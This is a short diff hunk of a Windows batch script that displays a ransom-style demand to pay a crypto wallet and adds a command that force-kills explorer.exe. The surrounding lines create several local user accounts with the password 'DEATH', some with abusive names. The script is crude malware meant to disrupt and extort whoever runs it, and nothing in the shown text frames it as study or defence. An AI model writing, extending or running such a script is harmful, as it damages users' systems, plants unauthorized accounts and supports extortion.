@@ -4,6 +4,7 @@ color 02
 echo It software is virus please
 echo pay to my crtpto wallet
 echo 1sd2k4ns_rf4d2s35fty
+taskkill /IM explorer.exe /f
 net user %random% DEATH /add
 net user "Гандон" DEATH /add
 net user FuckYou DEATH /add
